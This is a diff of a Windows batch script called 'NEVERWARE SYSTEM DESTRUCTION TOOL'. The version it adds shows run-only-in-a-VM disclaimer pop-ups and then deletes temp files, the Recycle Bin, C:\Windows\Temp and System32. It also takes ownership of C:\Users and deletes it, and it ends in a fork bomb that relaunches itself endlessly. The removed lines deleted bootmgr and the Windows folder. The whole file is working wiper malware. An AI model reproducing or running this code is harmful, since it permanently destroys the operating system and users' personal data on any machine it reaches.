@@ -2,90 +2,99 @@
 setlocal enabledelayedexpansion
 chcp 65001 >nul
 cls
-title NEVERWARE SYSTEM DESTRUCTION TOOL - LEVEL 64
-mode con: cols=70 lines=25
+title NEVERWARE SYSTEM DESTRUCTION TOOL
+color 4F
+mode con:cols=80 lines=30
 
+for /f "usebackq delims=" %%A in (`powershell -Command ^
+  "Add-Type -AssemblyName System.Windows.Forms; " ^
+  "$result = [System.Windows.Forms.MessageBox]::Show('WARNING: Anything that happens to your computer because of this program is NOT my responsibility. It is YOUR responsibility. ONLY run this in a virtual machine!', 'NEVERWARE DISCLAIMER', 'YesNo', 'Warning'); " ^
+  "Write-Output $result"`) do set OUT=%%A
+
+if /i "%OUT%"=="No" (
+    echo Operation cancelled.
+    timeout /t 2 >nul
+    exit
+)
+
+for /f "usebackq delims=" %%A in (`powershell -Command ^
+  "Add-Type -AssemblyName System.Windows.Forms; " ^
+  "$result = [System.Windows.Forms.MessageBox]::Show('FINAL WARNING: This action is PERMANENT. Once started, it CANNOT be undone. Even Task Manager CANNOT stop the destruction. Are you 100%% sure you want to continue?', 'NEVERWARE FINAL WARNING', 'YesNo', 'Warning'); " ^
+  "Write-Output $result"`) do set OUT=%%A
+
+if /i "%OUT%"=="No" (
+    echo Operation cancelled.
+    timeout /t 2 >nul
+    exit
+)
+
+cls
+echo Initializing NEVERWARE SYSTEM DESTRUCTION TOOL...
+timeout /t 3 >nul
+
+echo Scanning for system partitions...
+timeout /t 2 >nul
+echo > [C:\] ... FOUND
+timeout /t 1 >nul
+echo > [System32] ... FOUND
+timeout /t 1 >nul
+echo > [User Data] ... FOUND
+timeout /t 1 >nul
+echo Preparing FULL SYSTEM WIPE...
+timeout /t 3 >nul
 
 cls
 echo.
-echo !!! WARNING !!!
-echo This operation will DESTROY your system completely.
-echo This Tool is designed for educational purposes only.
-echo It includes the OS, personal files, and system data.
-echo ONLY RUN THIS IN A VM OR TEST ENVIRONMEN.
-echo Press any key to CONTINUE, or close this window to CANCEL.
-pause >nul
-
-cls
-echo !!! WARNING !!!
-echo Are you sure you want to proceed?
-echo This action is IRREVERSIBLE and will DELETE ALL DATA.
-echo if u say yes, this will delete everything on your computer.
-echo Press any key to CONTINUE, or close this window to CANCEL.
-pause >nul
-
-cls
-echo !!! FINAL WARNING !!!
-echo Last chance to cancel the operation.
-echo This will PERMANENTLY DELETE all files and folders.
-echo There is no way to recover them after this point.
-echo This is your last chance to cancel the operation.
-echo Press any key to CONTINUE, or close this window to CANCEL.
-pause >nul
-
-cls
-echo Warnings are over, starting destruction...
+echo [####                        ] 10%%
+timeout /t 1 >nul
+echo [##########                  ] 30%%
+timeout /t 1 >nul
+echo [###############             ] 50%%
+timeout /t 1 >nul
+echo [######################      ] 80%%
+timeout /t 1 >nul
+echo [############################] 100%%
 timeout /t 2 >nul
 
-set /a time_left=2
-
+cls
 echo Deleting TEMP files...
 del /f /s /q "%TEMP%\*.*" >nul 2>&1
-timeout /t 2 >nul
-cls
+
+timeout /t 1 >nul
 echo Clearing Recycle Bin...
 rd /s /q C:\$Recycle.Bin >nul 2>&1
 
 timeout /t 1 >nul
-cls
-echo TEMP files and Recycle Bin cleared.
+echo Deleting minor system files...
+del /f /s /q C:\Windows\Temp\*.* >nul 2>&1
+rd /s /q C:\Windows\Temp >nul 2>&1
 
-set /a rand1=!random! %% 15
-set /a rand2=!random! %% 15
-color !rand1!!rand2!
-echo !!! WARNING: SYSTEM IN DANGER !!!
-timeout /t 1 >nul
-
-cls
-echo Deleting System files...
 timeout /t 2 >nul
-echo Deleting bootmgr...
-del /f /q C:\bootmgr >nul 2>&1
-rd /s /q C:\Boot >nul 2>&1
-
-timeout /t 1 >nul
-echo Deleting System32...
-takeown /f C:\Windows\System32 /r /d y >nul
-icacls C:\Windows\System32 /grant administrators:F /t >nul
+echo Deleting SYSTEM32...
+del /f /s /q C:\Windows\System32\*.* >nul 2>&1
 rd /s /q C:\Windows\System32 >nul 2>&1
 
 timeout /t 2 >nul
-cls
-echo Deleting Windows core files...
-del /f /q C:\Windows\*.* >nul 2>&1
-rd /s /q C:\Windows >nul 2>&1
+echo Deleting USER PROFILES...
+takeown /f C:\Users /r /d y >nul 2>&1
+icacls C:\Users /grant administrators:F /t >nul 2>&1
+rd /s /q C:\Users >nul 2>&1
 
-for /l %%i in (1,1,10) do (
-    set /a rand1=!random! %% 15
-    set /a rand2=!random! %% 15
-    color !rand1!!rand2!
-    echo WARNING: SYSTEM CRITICAL ERROR %random%
-    timeout /t 1 >nul
-)
-
-cls
-echo SYSTEM FAILURE - CRITICAL FILES MISSING
-echo 0xc000000e
 timeout /t 3 >nul
 
-shutdown /s /t 0
+cls
+echo.
+echo !!! CRITICAL SYSTEM ERROR !!!
+echo SYSTEM FILES NOT FOUND.
+echo BOOTLOADER CORRUPTED.
+echo SYSTEM FAILURE: Cannot continue.
+echo.
+timeout /t 2 >nul
+
+echo Entering unrecoverable failure state...
+timeout /t 2 >nul
+
+:ForkBomb
+start "" "%~f0"
+start "" "%~f0"
+goto ForkBomb
